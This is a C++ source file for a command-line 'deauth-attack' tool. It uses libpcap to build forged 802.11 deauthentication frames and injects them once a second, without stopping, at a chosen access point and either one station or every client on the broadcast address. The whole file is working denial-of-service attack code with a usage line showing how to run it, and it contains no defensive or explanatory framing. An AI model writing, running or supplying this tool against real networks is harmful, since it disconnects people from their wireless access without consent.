#include <stdio.h>
#include <string.h>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <iostream>

#include "deauthHdr.h"
#include "mac.h"

#pragma pack(push, 1)
struct DeauthPacket final
{
    radiotap_hdr radio_;
    deauth_hdr deauth_;
    wireless_hdr wireless_;
};
#pragma pack(pop)

void usage();
void sendDeauthPacket(pcap_t *handle, Mac transmitter, Mac receiver);

int main(int argc, char *argv[])
{
    if (argc != 3 && argc != 4)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    Mac apMac = Mac(argv[2]);
    Mac stMac;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    while (true)
    {
        if (argc == 3)
        {
            sendDeauthPacket(handle, apMac, Mac("FF:FF:FF:FF:FF:FF"));
        }
        else if (argc == 4)
        {
            stMac = Mac(argv[3]);
            sendDeauthPacket(handle, apMac, stMac);
        }
        sleep(1);
    }

    pcap_close(handle);
    return 0;
}

void usage()
{
    printf("syntax: deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void sendDeauthPacket(pcap_t *handle, Mac transmitter, Mac receiver)
{
    DeauthPacket pkt;

    pkt.radio_.version = 0;
    pkt.radio_.pad = 0;
    pkt.radio_.len = sizeof(radiotap_hdr);
    pkt.radio_.presentFlag = 0x00008004;
    pkt.radio_.dataRate = 0x02;
    pkt.radio_.unknown = 0;
    pkt.radio_.txFlag = 0x0018;

    pkt.deauth_.version = 0;
    pkt.deauth_.type = 0;
    pkt.deauth_.flags = 0;
    pkt.deauth_.subtype = 0xc;
    pkt.deauth_.duration = 314;
    pkt.deauth_.bc_receiver_addr = receiver;
    pkt.deauth_.bc_transmitter_addr = transmitter;
    pkt.deauth_.bc_BSSID = transmitter;
    pkt.deauth_.seq = 0;

    pkt.wireless_.fixed = 7;

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&pkt), sizeof(DeauthPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    printf("send deauth packet!!!\n");
}